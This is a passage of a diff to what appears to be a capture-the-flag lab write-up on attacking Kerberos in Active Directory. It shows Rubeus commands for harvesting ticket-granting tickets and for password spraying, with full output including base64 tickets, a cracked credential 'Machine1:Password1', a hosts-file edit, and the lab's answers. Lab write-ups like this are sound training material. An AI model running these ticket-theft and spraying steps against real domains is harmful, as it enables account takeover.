@@ -319,3 +319,160 @@ Domain: `controller.local`
 
 Machine IP is `10.10.53.187`    
 
+### Harvesting Tickets
+
+Harvesting gathers tickets that are being transferred to the KDC and saves them for use in other attacks such as the pass the ticket attack.
+
+Rubeus is already compiled and on the target machine and cab be found in the Downloads folder.
+
+**USAGE**
+: `Rubeus.exe harvest /interval:30` - This command tells Rubeus to harvest for TGTs every 30 seconds
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe harvest /interval:30
+
+   ______        _                       
+  (_____ \      | |                      
+   _____) )_   _| |__  _____ _   _  ___  
+  |  __  /| | | |  _ \| ___ | | | |/___) 
+  | |  \ \| |_| | |_) ) ____| |_| |___ | 
+  |_|   |_|____/|____/|_____)____/(___/  
+                                         
+  v1.5.0                                 
+
+[*] Action: TGT Harvesting (with auto-renewal) 
+[*] Monitoring every 30 seconds for new TGTs          
+[*] Displaying the working TGT cache every 30 seconds 
+
+
+[*] Refreshing TGT ticket cache (8/4/2021 12:08:18 PM) 
+
+  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL                                                
+  StartTime             :  8/4/2021 11:58:41 AM                                                          
+  EndTime               :  8/4/2021 9:58:41 PM                                                           
+  RenewTill             :  8/11/2021 11:58:41 AM                                                         
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable               
+  Base64EncodedTicket   :                                                                                
+                                                                                                         
+    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 
+    
+    User                  :  Administrator@CONTROLLER.LOCAL
+  StartTime             :  8/4/2021 12:00:14 PM
+  EndTime               :  8/4/2021 10:00:14 PM
+  RenewTill             :  8/11/2021 12:00:14 PM
+  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  Base64EncodedTicket   :
+  
+    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
+    
+```    
+### Brute forcing and password spraying with Rubeus
+    
+   Rubeus can both brute force passwords as well as password spray user accounts. When brute-forcing passwords you use a single user account and a wordlist of passwords to see which password works for that given user account. In password spraying, you give a single password such as Password1 and "spray" against all found user accounts in the domain to find which one may have that password.
+
+This attack will take a given Kerberos-based password and spray it against all found users and give a .kirbi ticket. This ticket is a TGT that can be used in order to get service tickets from the KDC as well as to be used in attacks like the pass the ticket attack.
+
+Before password spraying with Rubeus, you need to add the domain controller domain name to the windows host file. You can add the IP and domain name to the hosts file from the machine by using the echo command: 
+
+`echo 10.10.53.187 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts`
+
+**USEAGE** 
+: `Rubeus.exe brute /password:Password1 /noticket` - This will take a given password and "spray" it against all found users then give the .kirbi TGT for that user. 
+
+Be mindful of how you use this attack as it may lock you out of the network depending on the account lockout policies.
+
+```
+controller\administrator@CONTROLLER-1 C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticke
+t
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+[-] Blocked/Disabled user => Guest
+[-] Blocked/Disabled user => krbtgt
+[+] STUPENDOUS => Machine1:Password1
+[*] base64(Machine1.kirbi):
+
+      doIFWjCCBVagAwIBBaEDAgEWooIEUzCCBE9hggRLMIIER6ADAgEFoRIbEENPTlRST0xMRVIuTE9DQUyi
+      JTAjoAMCAQKhHDAaGwZrcmJ0Z3QbEENPTlRST0xMRVIubG9jYWyjggQDMIID/6ADAgESoQMCAQKiggPx
+      BIID7YHLo2VEVuyhkFD7gzN0e274jDt1ZVm/LtZigOXt2XerHMMAivRo6s6Ly2XCgQNoS8gajgFd/0yp
+      lJhzL/SSWxIeOkGgfqReK0dT+UkZYdIe/5SCtCXx2YhKJ/SZCewjP1xKl3Mvq/ASD41KRkwZwEZQm0Uv
+      s+rkNQqSFGIx2jKqNMAMZ4KII8iXJSApRCwbXM/YQLpEh4+dN1ZVkgiRxn9hJ3GBlH67XArKwOmbw5Bc
+      +zJH97yEkPzu6b4UIOmzKS1H72cRwjNWvK8bwZzSQ9bPsBHuDsjHjs/7b+jSjT9oiYswzJ97mMY/MSpo
+      1lC2/8JDM10weD9U4TGFQGJW39qhlkl/Hp8G+nbpY1LyibT4bvXsUGVeiwjl8u3tEQkAPED3pW7tPhJ0
+      sUsiMU/zIadZgQu/2Am9IvrtK4PW6M62+Z9H0FIfrULf/60l0aqezrapn3SqRY8vli4oqTuLbfPv/enl
+      ZaxPMR64wZrdL/r/VaCmIEnuuyQEFvDkrmA5wFajUynHovYyBcpmRoCUO3htQllLEP3mct2zVi8rSkOq
+      3wap9Iu+iIudWYVsfMjXg+oJ40C5qI0V551FFJGb9INdmfQNSH2zAfAr4lb5yyGXuhPbisBj0mc9S+Mg
+      AGKhlyheLF2Xn2EvHbfDESJq3VOukVvVsSLeYOOC6gOl8GZMV2LjqEgxK03/u5DTgkDfS0PtnhJIaVbZ
+      FO37zSqWtieuKwH7GvbOG1lIWXKZxZpvt5Rw6Kjgg/9orFEaEUFNOj5UFkg8p/bVD051XUVJttUxg3S1
+      4LLLvqPUDHOZ1V9O5erAFunSDT8FUdUHj7Q0uDtbeIu/nHIrHn1P2eTC1i0J3BUlAW8mQgBU06M34Ofo
+      4ZqZr0Qpj4JoStg0+jtkSV1yVCSxOI4DG86DXcg9xitYR8XR0ngn12xXVya5GqoEre6a5QKcSeR5u7iU
+      vWhGWnQ4JZHBjf5A+rVCnAQcbjYueGiHh8NxmoD/SLgK/UIOMZCcL4BsRkY/IzYvvJ8hWV2CE/uWKZr+
+      IhUM+IFOFvt3jW9YfAhws0dlhFSBNFD8u0xmTPA8NrkuRRt11BMbkA81UqSqM+L1ZXalLR74X8EEwJOX
+      qFAWLXHVATxifNduAabHEamBcBc9P1rKhzpENL2oWXOFKcLoIRjjWlI28BwDoOv/xWij3RKL44tVMH2Y
+      fKj4NQhe9Ix2Pnc0C7M0dGgH/GlcF8T5xtXEIw4Lwo+Q2xe7ckdidFpcmLiBq3JyqIlgzYAheD5D5jo9
+      y9YDLRXrZrCv9M8bNkrSuWEo+T46hS0+qVll4HLJHbpkOk42w3X/NVykNEDdUDe/46OB8jCB76ADAgEA
+      ooHnBIHkfYHhMIHeoIHbMIHYMIHVoCswKaADAgESoSIEIK/HXXigV28dS3EyPBaifLRmxZLY9MI8xdQY
+      eb1Ti6a9oRIbEENPTlRST0xMRVIuTE9DQUyiFTAToAMCAQGhDDAKGwhNYWNoaW5lMaMHAwUAQOEAAKUR
+      GA8yMDIxMDgwNDE5MTg1M1qmERgPMjAyMTA4MDUwNTE4NTNapxEYDzIwMjEwODExMTkxODUzWqgSGxBD
+      T05UUk9MTEVSLkxPQ0FMqSUwI6ADAgECoRwwGhsGa3JidGd0GxBDT05UUk9MTEVSLmxvY2Fs
+
+
+
+[+] Done
+```
+### Questions
+
+1. Which domain admin do we get a ticket for when harvesting tickets?
+
+Answer
+: Administrator
+
+2. Which domain controller do we get a ticket for when harvesting tickets?
+
+Answer
+: CONTROLLER-1
+
+
